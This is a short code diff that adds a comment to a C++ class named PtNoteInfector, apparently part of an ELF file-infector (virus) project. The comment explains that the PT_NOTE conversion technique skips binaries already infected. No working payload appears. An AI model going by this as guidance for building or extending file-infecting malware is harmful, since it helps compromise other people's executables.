@@ -40,6 +40,10 @@ namespace vt::infector {
 // will). Other than that, this method pretty much allows virus of any size to
 // be inserted and has the highest success rate compared to text padding and
 // reverse text algorithms.
+//
+// Note that this algorithm will not infect victims that are already infected,
+// due to the fact that there is usually a single NOTE segment, which will be
+// converted during the first infection.
 
 class PtNoteInfector {
  public:
